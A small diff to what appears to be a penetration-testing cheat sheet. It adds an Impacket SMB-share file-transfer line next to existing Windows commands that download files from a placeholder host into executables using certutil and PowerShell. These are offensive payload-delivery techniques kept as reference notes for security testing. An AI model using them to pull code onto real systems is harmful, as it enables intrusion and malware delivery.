@@ -334,6 +334,7 @@ dir /a:h `show only hidden files`<br/>
 `certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe`<br />
 `powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`<br />
 `powershell Invoke-WebRequest -Uri $ip -OutFile $filepath`
+`smbserver.py Share /opt/share -smb2support , copy file \\IP\Share`
 
 ## Enumeration
 
